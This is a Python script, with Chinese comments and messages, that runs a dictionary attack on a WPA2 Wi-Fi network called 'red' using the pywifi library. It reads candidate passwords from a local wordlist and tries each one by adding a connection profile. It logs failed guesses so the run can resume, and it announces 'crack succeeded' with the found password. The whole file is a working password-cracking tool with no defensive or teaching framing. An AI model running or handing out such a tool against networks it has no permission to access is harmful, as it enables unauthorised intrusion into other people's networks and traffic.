# coding:utf-8
import pywifi
from pywifi import const
import time
import datetime
import os

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0] if wifi.interfaces() else None
FAILED_PWD_LOG = "D:/Users/Desktop/失败密码.txt"


def is_valid_password(pwd):
    return 8 <= len(pwd) <= 63 and pwd.isprintable()


def wait_connect(timeout=6):
    for _ in range(timeout * 2):
        if iface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(0.5)
    return False


def wifi_connect(pwd):
    if not iface:
        print("未找到无线网卡！")
        return False

    iface.disconnect()
    time.sleep(1)

    if iface.status() != const.IFACE_DISCONNECTED:
        return False

    profile = pywifi.Profile()
    profile.ssid = "red"
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = pwd.strip()

    iface.remove_all_network_profiles()

    try:
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        return wait_connect()
    except Exception as e:
        return False


def mark_failed(pwd):
    with open(FAILED_PWD_LOG, "a", encoding="utf-8") as f:
        f.write(pwd + "\n")


def load_failed():
    if os.path.exists(FAILED_PWD_LOG):
        with open(FAILED_PWD_LOG, "r", encoding="utf-8") as f:
            return set(line.strip() for line in f)
    return set()


def read_password():
    print("开始破解...")
    path = r"D:\Users\Desktop\密码字典.txt"

    try:
        with open(path, "r", encoding="utf-8") as f:
            all_pwds = [line.strip() for line in f if is_valid_password(line.strip())]
    except Exception as e:
        print(f"无法读取密码文件: {e}")
        return

    failed = load_failed()
    passwords = [pwd for pwd in all_pwds if pwd not in failed]

    total = len(passwords)
    start_time = datetime.datetime.now()

    for idx, pwd in enumerate(passwords, 1):
        print(f"进度: {idx}/{total} | 当前密码: {pwd}")

        if wifi_connect(pwd):
            print(f"\n✅ 破解成功！密码为: {pwd}")
            print(f"总耗时: {datetime.datetime.now() - start_time}")
            return
        else:
            mark_failed(pwd)

    print("\n❌ 密码字典中无匹配项。")


if __name__ == "__main__":
    read_password()
